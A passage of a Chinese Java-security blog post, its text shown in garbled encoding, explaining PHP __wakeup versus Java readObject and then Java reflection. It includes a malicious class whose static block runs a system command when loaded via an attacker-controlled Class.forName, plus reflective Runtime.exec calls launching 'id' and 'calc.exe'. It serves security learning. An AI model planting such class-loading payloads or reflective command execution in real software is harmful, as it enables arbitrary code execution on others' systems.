<p>Connectionçš„å¯¹è±¡è¢«ååºåˆ—åŒ–åè°ƒç”¨<code>__wakeup</code>ï¼Œæ‰§è¡Œconnectå‡½æ•°è¿æ¥æ•°æ®åº“ï¼Œæ‰€ä»¥<code>__wakeup</code>çš„ä½œç”¨å…¶å®æ˜¯ååºåˆ—åŒ–åæ‰§è¡Œä¸€äº›åˆå§‹åŒ–æ“ä½œï¼Œä½†åœ¨phpä¸­å¾ˆå°‘åˆ©ç”¨åºåˆ—åŒ–æ•°æ®ä¼ è¾“èµ„æºç±»å‹çš„å¯¹è±¡ï¼Œè€Œå…¶ä»–ç±»å‹çš„å¯¹è±¡åœ¨ååºåˆ—åŒ–çš„æ—¶å€™å·²ç»æŠŠå€¼å†™æ­»äº†ï¼Œæ‰€ä»¥phpçš„ååºåˆ—åŒ–æ¼æ´ä¸­å¾ˆå°‘æ˜¯ç”±<code>__wakeup</code>è¿™ä¸ªæ–¹æ³•è§¦å‘çš„ï¼Œé€šå¸¸è§¦å‘åœ¨<code>__destruct</code>ä¸­ã€‚</p>
<p>Javaååºåˆ—åŒ–ï¼š</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.Serializable;</span><br><span class="line"></span><br><span class="line">public class Person implements Serializable {</span><br><span class="line"></span><br><span class="line">    private String name;</span><br><span class="line">    private int age;</span><br><span class="line"></span><br><span class="line">    Person(String name,int age)</span><br><span class="line">    {</span><br><span class="line">        this.name = name;</span><br><span class="line">        this.age = age;</span><br><span class="line">    }</span><br><span class="line">    private void writeObject(java.io.ObjectOutputStream s) throws IOException {</span><br><span class="line">        s.defaultWriteObject();</span><br><span class="line">        s.writeObject("This is a Object");</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    private void writeObject(java.io.ObjectInputStream s) throws IOException, ClassNotFoundException {</span><br><span class="line">        s.defaultReadObject();</span><br><span class="line">        String message = (String) s.readObject();</span><br><span class="line">        System.out.println(message);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>

<p>åœ¨<code>writeObject</code>ä¸­ï¼Œå½“ä¼ å…¥çš„å¯¹è±¡å®Œæˆäº†ä»<code>ObjectOutputStream</code>ä¸­ç»§æ‰¿æ¥çš„<code>defaultWriteObject</code>åï¼Œå‘æµå†…å†™å…¥äº†ä¸€ä¸ªâ€This is a Objectâ€ï¼Œå› æ­¤ä¼šåœ¨åºåˆ—åŒ–åè§¦å‘æ”¹æ–¹æ³•ï¼Œå°†å­—ç¬¦ä¸²å†™å…¥è¾“å‡ºæµçš„å¯¹è±¡ä¸­ï¼Œç”¨çŸ¥è¯†æ˜Ÿçƒé‡Œæåˆ°çš„å·¥å…·SerializationDumperå¯ä»¥çœ‹åˆ°è¿™ä¸ªå­—ç¬¦ä¸²è¢«å†™åˆ°äº†objectAnnotationä½ç½®ï¼Œåœ¨ååºåˆ—åŒ–è¿˜åŸå¯¹è±¡æ—¶å°±ä¼šå°†è¿™ä¸ªå­—ç¬¦ä¸²è¾“å‡ºã€‚</p>
<p><img src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202209272017826.png" alt="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202209272017826.png"></p>
<p>ååºåˆ—åŒ–çš„è¿‡ç¨‹æ˜¯æ ¹æ®å¼€å‘è€…çš„æƒ³æ³•æ¥å®ç°çš„ï¼Œæ‰€ä»¥æ€»ç»“ä¸€ä¸‹<code>__wakeup</code>å’Œ<code>readObject</code>çš„ä¸åŒå°±æ˜¯ï¼š<code>readObject</code>å€¾å‘äºè§£å†³â€ååºåˆ—åŒ–æ—¶å¦‚ä½•è¿˜åŸä¸€ä¸ªå®Œæ•´å¯¹è±¡â€è¿™ä¸ªé—®é¢˜ï¼Œè€ŒPHPçš„<code>__wakeup</code>æ›´å€¾å‘äºè§£å†³ååºåˆ—åŒ–åå¦‚ä½•åˆå§‹åŒ–è¿™ä¸ªå¯¹è±¡çš„é—®é¢˜ã€‚</p>
<h1 id="åå°„-URLDNS"><a href="#åå°„-URLDNS" class="headerlink" title="åå°„+URLDNS"></a>åå°„+URLDNS</h1><h1 id="Javaåå°„ç¯‡"><a href="#Javaåå°„ç¯‡" class="headerlink" title="Javaåå°„ç¯‡"></a><strong>Javaåå°„ç¯‡</strong></h1><p>å¦‚æœæˆ‘ä»¬æœ‰ä¸€ä¸ªç±»ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥é€šè¿‡å®ä¾‹åŒ–è¯¥ç±»çš„å¯¹è±¡å¹¶è°ƒç”¨å…¶ä¸­çš„æ–¹æ³•ï¼Œæˆ–è€…æˆ‘ä»¬ä¹Ÿå¯ä»¥ç›´æ¥è°ƒç”¨è¯¥ç±»ä¸­çš„é™æ€æ–¹æ³•ï¼Œè¿™æ˜¯æˆ‘ä»¬åœ¨ä¸€èˆ¬æƒ…å†µä¸‹è°ƒç”¨ä¸€ä¸ªæ–¹æ³•æ—¶çš„è¿‡ç¨‹ï¼Œä½†æ˜¯åœ¨ä¸åŒçš„è¯­è¨€ä¸­ä¹Ÿæœ‰ä¸åŒçš„æ–¹æ³•å¯ä»¥æ‹¿åˆ°æŸä¸€ä¸ªç±»ä¸­çš„æ‰€æœ‰å†…å®¹ï¼Œåœ¨javaä¸­æˆ‘ä»¬å¯ä»¥é€šè¿‡â€œåå°„â€æ¥æ‹¿åˆ°æŸä¸€ä¸ªç±»ä¸­çš„å…·ä½“å†…å®¹ å¦‚æœæŠŠé€šè¿‡newå¯¹è±¡å¹¶ä¸”è°ƒç”¨å…¶ä¸­çš„æ–¹æ³•çš„è¿‡ç¨‹å«åšâ€œæ­£å°„â€ï¼Œé‚£ä¹ˆä¸ä½¿ç”¨newæ¥åˆ›å»ºå¯¹è±¡å¹¶è°ƒç”¨å…¶ä¸­æ–¹æ³•çš„è¿‡ç¨‹å°±å«åšâ€œåå°„â€</p>
<h2 id="åå°„å¸¸ç”¨åˆ°çš„æ–¹æ³•"><a href="#åå°„å¸¸ç”¨åˆ°çš„æ–¹æ³•" class="headerlink" title="åå°„å¸¸ç”¨åˆ°çš„æ–¹æ³•"></a><strong>åå°„å¸¸ç”¨åˆ°çš„æ–¹æ³•</strong></h2><p>åœ¨javaçš„langåŒ…ä¸­æœ‰ä¸€ä¸ªé™æ€Classç±» åœ¨javaç¨‹åºè¿è¡Œå¹¶ç¼–è¯‘åŠ è½½ä¸€ä¸ªç±»æ—¶ï¼Œjava.lang.Classå°±ä¼šå®ä¾‹åŒ–å‡ºä¸€ä¸ªå¯¹è±¡ï¼Œè¿™ä¸ªå¯¹è±¡å‚¨å­˜è¯¥ç±»çš„æ‰€æœ‰ä¿¡æ¯ å› æ­¤æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸€äº›æ–¹æ³•æ¥è·å–åˆ°è¿™ä¸ªç±»çš„ä¿¡æ¯ å…ˆäº†è§£ä¸€äº›æ–¹æ³•</p>
<ul>
<li><code>Class.forName(classname)</code> è·å–classnameç±»ä¸­çš„æ‰€æœ‰å±æ€§åŒ…æ‹¬ç±»å æ¯”å¦‚<code>Class clazz = Class.forName("java.lang.Runtime");</code></li>
</ul>
<p>é‚£ä¹ˆç±»clazzä¸­å°±å¾—åˆ°äº†java.lang.Runtimeä¸­çš„æ‰€æœ‰å±æ€§</p>
<ul>
<li><code>Class.newInstance()</code>å®ä¾‹åŒ–å¯¹è±¡ï¼Œå¹¶è§¦å‘è¯¥ç±»çš„æ„é€ æ–¹æ³• ä¸‹é¢ä¼šè¯¦ç»†è§£é‡Š</li>
<li><code>Class.getMethod(method name,arg)</code> è·å–ä¸€ä¸ªå¯¹è±¡ä¸­çš„publicæ–¹æ³•ï¼Œç”±äºjavaæ”¯æŒæ–¹æ³•çš„é‡è½½ï¼Œæ‰€ä»¥éœ€è¦ç¬¬äºŒå‚æ•°ä½œä¸ºè·å–çš„æ–¹æ³•çš„å½¢å‚åˆ—è¡¨ï¼Œè¿™æ ·å°±å¯ä»¥ç¡®å®šè·å–çš„æ˜¯å“ªä¸€ä¸ªæ–¹æ³•</li>
<li><code>Method.invoke</code>() æ‰§è¡Œæ–¹æ³•ï¼Œå¦‚æœæ˜¯ä¸€ä¸ªæ™®é€šæ–¹æ³•ï¼Œåˆ™invokeçš„ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºè¯¥æ–¹æ³•æ‰€åœ¨çš„å¯¹è±¡ï¼Œå¦‚æœæ˜¯é™æ€æ–¹æ³•åˆ™ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯nullæˆ–è€…è¯¥æ–¹æ³•æ‰€åœ¨çš„ç±» ç¬¬äºŒä¸ªå‚æ•°ä¸ºè¦æ‰§è¡Œæ–¹æ³•çš„å‚æ•°</li>
</ul>
<p><code>forName</code>å¹¶ä¸æ˜¯å”¯ä¸€è·å–ä¸€ä¸ªç±»çš„æ–¹å¼ï¼Œå…¶ä»–æ–¹å¼è¿˜æœ‰ï¼š</p>
<ul>
<li>obj.getClass() å¦‚æœä¸Šä¸‹æ–‡ä¸­å­˜åœ¨æŸä¸ªç±»çš„å®ä¾‹objï¼Œé‚£æˆ‘ä»¬å¯ä»¥ç›´æ¥é€šè¿‡obj.getClassæ¥è·å–å®ƒçš„ç±»</li>
<li>Y1.class å¦‚æœå·²ç»åŠ è½½äº†ä¸€ä¸ªç±»Y1ï¼Œåªæ˜¯æƒ³è·å–åˆ°å®ƒç”±java.lang.classæ‰€åˆ›é€ çš„å¯¹è±¡ï¼Œé‚£ä¹ˆå°±ç›´æ¥ä½¿ç”¨è¿™ç§æ–¹æ³•è·å–å³å¯ï¼Œè¿™ç§æ–¹æ³•å¹¶ä¸å±äºåå°„</li>
<li>Class.Forname å¦‚æœçŸ¥é“æŸä¸ªç±»çš„åå­—ï¼Œæƒ³è·å–åˆ°è¿™ä¸ªç±»ï¼Œå°±å¯ä»¥ä½¿ç”¨forNameæ¥è·å–</li>
</ul>
<h3 id="å…³äºforname"><a href="#å…³äºforname" class="headerlink" title="å…³äºforname"></a><strong>å…³äºforname</strong></h3><p>é»˜è®¤æƒ…å†µä¸‹ <code>forName</code>çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ç±»åï¼Œç¬¬äºŒä¸ªå‚æ•°è¡¨ç¤ºæ˜¯å¦åˆå§‹åŒ–ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°å°±æ˜¯ClassLoader</p>
<p>ClassLoaderæ˜¯ä¸€ä¸ªâ€œåŠ è½½å™¨â€ï¼Œå‘Šè¯‰javaè™šæ‹Ÿæœºå¦‚ä½•åŠ è½½è¿™ä¸ªç±»ï¼Œjavaé»˜è®¤çš„ClassLoaderå°±æ˜¯æ ¹æ®ç±»ååŠ è½½ç±»ï¼Œè¿™ä¸ªç±»åå¿…é¡»æ˜¯å®Œæ•´è·¯å¾„ï¼Œæ¯”å¦‚ä¸Šé¢æåˆ°çš„java.lang.Runtime</p>
<p>ç¬¬äºŒä¸ªå‚æ•°<code>initialize</code>ç”¨äºfornameæ—¶çš„åˆå§‹åŒ–ï¼Œä¸€èˆ¬æˆ‘ä»¬ä¼šè®¤ä¸ºåˆå§‹åŒ–å°±æ˜¯åŠ è½½ç±»çš„æ„é€ å‡½æ•°ï¼Œå…¶å®å¹¶ä¸æ˜¯ï¼Œè¿™é‡Œæåˆ°çš„åˆå§‹åŒ–æœ‰ä»¥ä¸‹è¿‡ç¨‹ï¼š</p>
<p>çœ‹ä¸‹é¢è¿™ä¸ªç±»ï¼š</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">class TrainPrint{</span><br><span class="line">    {</span><br><span class="line">        System.out.printf("Empty block inittial &amp;s\\n", this.getClass());</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    static{</span><br><span class="line">        System.out.printf("Static initial %s\\n", TrainPrint.class);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    public TrainPrint(){</span><br><span class="line">        System.out.printf("Innitial %s\\n", this.getClass());</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>

<p>è¿™ä¸ªç±»ä¸­ä¸€å…±æœ‰ä¸‰ä¸ªä»£ç å— ï¼Œåœ¨è¿›è¡Œåˆå§‹åŒ–æ—¶æŒ‰ç…§ä»¥ä¸‹ä¼˜å…ˆçº§è°ƒç”¨ä»£ç å—</p>
<ol>
<li>static{}</li>
<li>{}</li>
<li>æ„é€ å‡½æ•°</li>
</ol>
<p><img src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202209141644920.png" alt="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202209141644920.png"></p>
<p>å…¶ä¸­ï¼Œstatic{}å°±æ˜¯åœ¨â€œç±»åˆå§‹åŒ–â€æ—¶è°ƒç”¨çš„ï¼Œè€Œ{}ä¸­çš„ä»£ç ä¼šæ”¾åœ¨æ„é€ å‡½æ•°çš„<code>super()</code>åé¢ï¼Œä½†åœ¨å½“å‰æ„é€ å‡½æ•°å†…å®¹çš„å‰é¢</p>
<p>æ‰€ä»¥<code>forNmae</code>ä¸­çš„<code>initialize=true</code>å…¶å®å°±æ˜¯å‘Šè¯‰jvmæ˜¯å¦æ‰§è¡Œâ€œç±»åˆå§‹åŒ–â€</p>
<p>é‚£ä¹ˆ å¦‚æœæœ‰ä»¥ä¸‹æ–¹æ³• å…¶ä¸­çš„å‚æ•°nameå¯æ§ï¼š</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public void ref(String name) throws Exception {</span><br><span class="line">		Class.forName(name);</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>

<p>æˆ‘ä»¬å°±å¯ä»¥ç¼–å†™ä¸€ä¸ªæ¶æ„ç±»ï¼Œå°†æ¶æ„ä»£ç æ”¾ç½®åœ¨<code>static{}</code>ä¸­ï¼Œä»è€Œæ‰§è¡Œï¼š</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">class PayLoad{</span><br><span class="line">    static{</span><br><span class="line">        try{</span><br><span class="line">            Runtime rt = Runtime.getRuntime();</span><br><span class="line">            String[] commands = {"touch", "/etc/passwd"};</span><br><span class="line">            Process pc = rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line"></span><br><span class="line">        } catch (Exception e){</span><br><span class="line"></span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>

<h2 id="å¦‚ä½•é€šè¿‡åå°„æ‰§è¡Œå‘½ä»¤"><a href="#å¦‚ä½•é€šè¿‡åå°„æ‰§è¡Œå‘½ä»¤" class="headerlink" title="å¦‚ä½•é€šè¿‡åå°„æ‰§è¡Œå‘½ä»¤"></a><strong>å¦‚ä½•é€šè¿‡åå°„æ‰§è¡Œå‘½ä»¤</strong></h2><p>æˆ‘ä»¬åˆšæ‰æåˆ°ï¼Œå¦‚æœæƒ³æ‹¿åˆ°ä¸€ä¸ªç±»ï¼Œéœ€è¦å…ˆimportæ‰èƒ½ä½¿ç”¨ï¼Œè€Œä½¿ç”¨fornameå°±ä¸éœ€è¦äº†ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨fornameåŠ è½½ä»»æ„ç±»ã€‚</p>
<p>åœ¨javaä¸­æ˜¯æ”¯æŒå†…éƒ¨ç±»çš„ï¼Œæ¯”å¦‚æˆ‘ä»¬åœ¨æ™®é€šç±» c1ä¸­ç¼–å†™å†…éƒ¨ç±»c2ï¼Œåœ¨ç¼–è¯‘æ—¶ä¼šç”Ÿæˆä¸¤ä¸ªæ–‡ä»¶ï¼šc1.classå’Œc1$c2.classï¼Œè¿™ä¸¤ä¸ªç±»ä¹‹é—´å¯ä»¥çœ‹ä½œæ²¡æœ‰å…³è”ï¼Œé€šè¿‡<code>Class.forname("c1$c2")</code>å³å¯åŠ è½½è¿™ä¸ªå†…éƒ¨ç±»ï¼Œå½“fastjsonåœ¨<code>checkAutotype</code>æ—¶å°±ä¼šå…ˆè®²$æ›¿æ¢æˆ<code>.</code> ä¸Šé¢è¯´åˆ°çš„<code>$</code>çš„ä½œç”¨æ—¶æŸ¥æ‰¾å†…éƒ¨ç±»ã€‚</p>
<p>å½“æˆ‘ä»¬é€šè¿‡åå°„è·å–åˆ°ä¸€ä¸ªç±»ä¹‹åï¼Œå¯ä»¥ç»§ç»­é€šè¿‡åå°„æ¥è°ƒç”¨å…¶ä¸­çš„å±æ€§å’Œæ–¹æ³•ï¼Œä¹Ÿå¯ä»¥ç»§ç»­å®ä¾‹åŒ–è¿™ä¸ªç±»ï¼Œè°ƒç”¨å…¶ä¸­çš„æ–¹æ³•ï¼Œä¹Ÿå°±æ˜¯ç”¨<code>newInstance()</code></p>
<p>ä¸Šé¢æåˆ°è¿‡newInstanceä¼šå®ä¾‹åŒ–ç±»ï¼Œå¹¶ä¸”è§¦å‘å®ƒçš„æ„é€ æ–¹æ³•ï¼Œæ‰€ä»¥åœ¨ä¸€äº›æƒ…å†µä¸‹newInstanceæ˜¯ä¸èƒ½æˆåŠŸæ‰§è¡Œçš„ï¼Œæ¯”å¦‚</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Class clazz = Class.forName("java.lang.Runtime");</span><br><span class="line">clazz.getMethod("exec",String.class).invoke(clazz.newInstance(), "id");</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202209181327117.png" alt="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202209181327117.png"></p>
<p>æˆ‘ä»¬åˆ†æä¸Šé¢ä¸¤è¡Œä»£ç ï¼Œé¦–å…ˆé€šè¿‡åå°„å°†<code>java.lang.Runtime</code>ä¸­çš„æ‰€æœ‰å±æ€§å’Œæ–¹æ³•å­˜åˆ°äº†clazzä¸­ï¼Œç»§ç»­åˆ©ç”¨åå°„æ‹¿åˆ°clazzï¼ˆRuntimeï¼‰ä¸­çš„<code>exec</code>æ–¹æ³•ï¼Œæœ€åä½¿ç”¨invokeæ‰§è¡Œè¯¥æ–¹æ³•ï¼Œé—®é¢˜å°±å‡ºåœ¨ä¹invokeçš„å‚æ•°ä¸Šã€‚</p>
<p>æˆ‘ä»¬ä¸Šé¢æåˆ°äº†invokeæ‰§è¡Œæ–¹æ³•ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯è¯¥æ–¹æ³•æ‰€åœ¨çš„å¯¹è±¡æˆ–è€…ç±»ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬éœ€è¦é€šè¿‡<code>clazz.newInstance</code>æ¥å®ä¾‹åŒ–clazzï¼Œä½œä¸ºinvokeçš„å‚æ•°ï¼Œä½†clazzçš„æ„é€ å‡½æ•°æ¥è‡ªäºRuntimeï¼Œæˆ‘ä»¬çœ‹ä¸€ä¸‹Runtimeçš„æ„é€ å‡½æ•°</p>
<p><img src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202209181331852.png" alt="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202209181331852.png"></p>
<p>Runtimeçš„æ„é€ æ–¹æ³•ä¸ºç§æœ‰ï¼Œæ‰€ä»¥åœ¨newInstanceæ—¶æ‰ä¼šæŠ¥é”™ã€‚</p>
<p>è¿™é‡ŒPç¥çš„<strong>javaå®‰å…¨æ¼«è°ˆ</strong>é‡Œè¯´æ˜äº†ä¸ºä»€ä¹ˆè¦å°†æ„é€ æ–¹æ³•è®¾ä¸ºç§æœ‰ï¼Œè¿™å°±æ˜¯å¾ˆå¸¸è§çš„â€œå•ä¾‹æ¨¡å¼â€ã€‚</p>
<p>æ¯”å¦‚å¯¹äºwebåº”ç”¨æ¥è¯´ï¼Œæ•°æ®åº“åªéœ€è¦å»ºç«‹ä¸€æ¬¡é“¾æ¥ï¼Œè€Œä¸æ˜¯æ¯æ¬¡ç”¨åˆ°æ•°æ®åº“éƒ½è¦å»ºç«‹ä¸€æ¬¡æ–°çš„è¿æ¥ï¼Œä½œä¸ºå¼€å‘è€…å°±å¯ä»¥å°†æ•°æ®åº“è¿æ¥ä½¿ç”¨çš„æ„é€ å‡½æ•°è®¾ä¸ºç§æœ‰ï¼Œç„¶åç¼–å†™ä¸€ä¸ªé™æ€æ–¹æ³•æ¥è·å–ï¼š</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">public class TrainDB() {</span><br><span class="line">	private static TrainDB instance = new TrainDB();</span><br><span class="line"></span><br><span class="line">	public static TrainDB getInstance() {</span><br><span class="line">		return instance;</span><br><span class="line">	}</span><br><span class="line"></span><br><span class="line">	private TrainDB() {</span><br><span class="line">	// å»ºç«‹è¿æ¥çš„ä»£ç </span><br><span class="line">	}</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>

<p>åœ¨è¿™ä¸ªç±»åˆå§‹åŒ–æ—¶ï¼Œå°±ä¼šåœ¨ç±»å†…éƒ¨å®ä¾‹åŒ–å‡ºä¸€ä¸ªè¿æ¥æ•°æ®åº“çš„å¯¹è±¡ï¼Œæˆ‘ä»¬åœ¨éœ€è¦æ•°æ®åº“è¿æ¥æ—¶ï¼Œåªéœ€è¦è°ƒç”¨å…¶ä¸­çš„<code>getInstance()</code>æ–¹æ³•è·å–è¿™ä¸ªå¯¹è±¡å³å¯ã€‚</p>
<p>å›åˆ°å¦‚ä½•æ‰§è¡Œå‘½ä»¤ä¸Šï¼Œå¦‚æœä¸èƒ½é€šè¿‡å®ä¾‹åŒ–è°ƒç”¨æ–¹æ³•ï¼Œæˆ‘ä»¬å°±å¯ä»¥å°è¯•ç»§ç»­é€šè¿‡åå°„æ¥è°ƒç”¨æ–¹æ³•ï¼Œæˆ‘ä»¬å°†ä»£ç æ”¹æˆä¸‹é¢è¿™æ ·å°±å¯ä»¥äº†ï¼š</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Class clazz = Class.forname("java.lang.Runtime");</span><br><span class="line">clazz.getMethod("exec",String.class).invoke(clazz.getMethod("getRuntime").invoke(clazz),"calc.exe");</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>

<p>æˆ‘ä»¬åœ¨åˆšå¼€å§‹æ‰§è¡Œå‘½ä»¤æ—¶å°±ç”¨åˆ°äº†Runtimeæ¥è·å–å…¶ä¸­çš„<code>exec</code>æ–¹æ³•ï¼Œä¸éš¾çœ‹å‡ºå®ƒå’Œpythonçš„osç±»ä¼¼ï¼Œç»™æˆ‘ä»¬æä¾›äº†ä¸€äº›å¯ä»¥æ‰§è¡Œå‘½ä»¤çš„æ–¹æ³•ï¼Œé‚£ä¹ˆRuntimeåˆ°åº•æœ‰ä»€ä¹ˆä½œç”¨ï¼Ÿ<br>æ¯å½“æˆ‘ä»¬æ‰§è¡Œä¸€ä¸ªjavaç¨‹åºæ—¶ï¼ŒRuntimeç±»éƒ½ä¼šç”Ÿæˆä¸€ä¸ªå®ä¾‹ï¼Œæ¥å‚¨å­˜å½“å‰è¿è¡Œçš„javaç¨‹åºçš„ç›¸å…³ä¿¡æ¯ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡Runtimeç±»ä¸­çš„<code>getRuntime()</code>æ–¹æ³•æ¥è°ƒç”¨å½“å‰javaç¨‹åºçš„è¿è¡Œç¯å¢ƒï¼ˆä¹Ÿå°±æ˜¯ä¸Šé¢æåˆ°çš„å‚¨å­˜ç›¸å…³ä¿¡æ¯çš„å®ä¾‹ï¼‰ï¼Œè¿™æ ·å°±å¯ä»¥åœ¨æ‰§è¡Œç³»ç»Ÿå‘½ä»¤æ—¶è®©jvmçŸ¥é“æˆ‘ä»¬è¦å¯¹å“ªä¸ªjavaç¨‹åºæ‰§è¡Œå‘½ä»¤</p>
<p>æˆ‘ä»¬åˆ†æä»¥ä¸‹ä¸Šé¢æ‰§è¡Œå‘½ä»¤çš„ä¸¤è¡Œä»£ç </p>
<ul>
<li>é€šè¿‡åå°„è·å¾—Runtimeç±»</li>
<li>é€šè¿‡åå°„è·å¾—clazz(Runtime)ä¸­çš„<code>exec</code>æ–¹æ³•</li>
<li><code>invoke()</code>è°ƒç”¨execæ–¹æ³•</li>
<li>è°ƒç”¨<code>getRuntime()</code>å°†å½“å‰javaç¨‹åºè¿è¡Œçš„ç¯å¢ƒä½œä¸ºå‚æ•°ä¼ é€’ç»™invokeï¼Œå¹¶æ‰§è¡Œå‘½ä»¤<code>exec "calc.exe"</code></li>
</ul>
<p>å¯ä»¥å‘ç°æˆ‘ä»¬åœ¨ç”¨invokeæ‰§è¡ŒRuntimeä¸­çš„å‘½ä»¤æ—¶ï¼Œå¦‚æœä¸èƒ½é€šè¿‡<code>newInstance</code>æ¥å®ä¾‹åŒ–å¯¹è±¡ä½œä¸ºå‚æ•°ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è°ƒç”¨<code>getRuntime()</code>æ¥è·å–å½“å‰ç¯å¢ƒï¼Œä»è€Œä»£æ›¿invokeçš„ç¬¬ä¸€ä¸ªå‚æ•°ã€‚</p>
<p>ä¸Šé¢æ‰§è¡Œå‘½ä»¤çš„ä¸¤è¡Œä»£ç åˆ†è§£å¼€å°±æ˜¯ï¼š</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Class clazz = Class.forname("java.lang.Runtime");</span><br><span class="line">Method execMethod = clazz.getMethod("exec", String.class);</span><br><span class="line">Method getRuntime = clazz.getMethod("getRuntime")ï¼›</span><br><span class="line">Object currentRuntime = getRuntime.invoke(clazz);</span><br><span class="line">execMethod.invoke(currentRuntime, "calc.exe");</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>

<h2 id="ä¸€äº›å…¶ä»–çš„åå°„æœºåˆ¶"><a href="#ä¸€äº›å…¶ä»–çš„åå°„æœºåˆ¶" class="headerlink" title="ä¸€äº›å…¶ä»–çš„åå°„æœºåˆ¶"></a><strong>ä¸€äº›å…¶ä»–çš„åå°„æœºåˆ¶</strong></h2><ul>
<li>æˆ‘ä»¬åˆšæ‰è¯´åˆ°å¯ä»¥é€šè¿‡fornameæ‹¿åˆ°äº†ä¸€ä¸ªç±»ï¼Œå¹¶ä¸”ç»§ç»­åˆ©ç”¨åå°„æˆ–å®ä¾‹åŒ–è°ƒç”¨å…¶ä¸­çš„æ–¹æ³•ï¼Œå¦‚æœä¸€ä¸ªç±»æ²¡æœ‰æ— å‚æ„é€ æ–¹æ³•æˆ–è€…ä¹Ÿæ²¡æœ‰ç±»ä¼¼å•ä¾‹æ¨¡å¼é‡Œçš„é™æ€æ–¹æ³•ï¼Œé‚£æˆ‘ä»¬åº”è¯¥æ€æ ·é€šè¿‡åå°„å®ä¾‹åŒ–è¯¥ç±»å‘¢ï¼Ÿ</li>
<li>å¦‚æœä¸€ä¸ªæ–¹æ³•æˆ–æ„é€ æ–¹æ³•æ˜¯ç§æœ‰æ–¹æ³•ï¼Œæˆ‘ä»¬åº”è¯¥æ€ä¹ˆå»æ‰§è¡Œå®ƒå‘¢ï¼Ÿ</li>
</ul>
